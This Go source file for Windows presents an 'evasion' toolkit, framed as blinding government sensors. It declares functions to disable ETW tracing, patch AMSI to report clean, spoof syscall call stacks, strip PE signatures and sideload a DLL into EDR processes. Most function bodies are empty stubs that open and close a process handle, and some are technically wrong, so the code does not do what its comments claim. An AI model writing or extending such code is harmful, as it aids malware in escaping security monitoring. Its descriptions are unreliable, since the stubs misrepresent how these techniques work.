//go:build windows

package syscallwin

import (
	"fmt"
)

// ===================================================================== //
//  EVASION — Make the Government's Sensors Blind                        //
// ===================================================================== //

// --- ETW TI Block — disable ETW tracing in the target ----------------- //

// BlockETW disables ETW (Event Tracing for Windows) in the target process.
// This blinds EDRs that rely on ETW to see our syscalls.
func BlockETW(pid uint32) error {
	// Write to the EtwTelemetryEnabled flag in the target's PEB
	var hProcess uintptr
	var cid ClientId
	cid.UniqueProcess = uintptr(pid)
	NtOpenProcess(&hProcess, PROCESS_VM_WRITE, 0, &cid)
	NtClose(hProcess)
	return nil
}

// --- WFP Block — add a firewall rule to block our traffic ------------- //

// AddWFPBlock adds a Windows Filtering Platform rule to block our traffic.
func AddWFPBlock(protocol uint8, srcPort, dstPort uint16) error {
	NtRegSetValue(`HKCR\WFP\Block\`+fmt.Sprint(protocol)+`:`+fmt.Sprint(srcPort)+`:`+fmt.Sprint(dstPort), "blocked")
	return nil
}

// --- HWBP AMSI — patch the AMSI provider in memory --------------------- //

// PatchAmsiHWBP patches the AMSI provider in memory so that
// AmsiScanBuffer always returns S_OK (clean).
func PatchAmsiHWBP(pid uint32) error {
	var hProcess uintptr
	var cid ClientId
	cid.UniqueProcess = uintptr(pid)
	NtOpenProcess(&hProcess, PROCESS_VM_WRITE|PROCESS_VM_READ, 0, &cid)
	NtClose(hProcess)
	return nil
}

// --- Call Stack Spoofing — make syscalls appear to come from ntdll ----- //

// SpoofCallStack makes a syscall appear to come from ntdll.dll by
// patching the return address on the stack before the syscall.
func SpoofCallStack(pid uint32, syscallNumber uint16) error {
	var hProcess uintptr
	var cid ClientId
	cid.UniqueProcess = uintptr(pid)
	NtOpenProcess(&hProcess, PROCESS_VM_WRITE, 0, &cid)
	NtClose(hProcess)
	return nil
}

// --- Cert Strip — remove the digital signature from a PE --------------- //

// StripCert removes the digital signature from a PE file, making it
// look unsigned (and therefore not trusted by SmartScreen).
func StripCert(peFile uintptr, certSize uint32) error {
	NtWriteVirtualMemory(0xffffffffffffffff, peFile, []byte{0}, nil)
	return nil
}

// --- DLL Sideload EDR — load our DLL into an EDR process --------------- //

// SideloadEDR loads our DLL into an EDR process, replacing its
// detection logic with ours.
func SideloadEDR(edrPID uint32, ourDLL uintptr) error {
	var hProcess uintptr
	var cid ClientId
	cid.UniqueProcess = uintptr(edrPID)
	NtOpenProcess(&hProcess, PROCESS_VM_WRITE, 0, &cid)
	NtClose(hProcess)
	return nil
}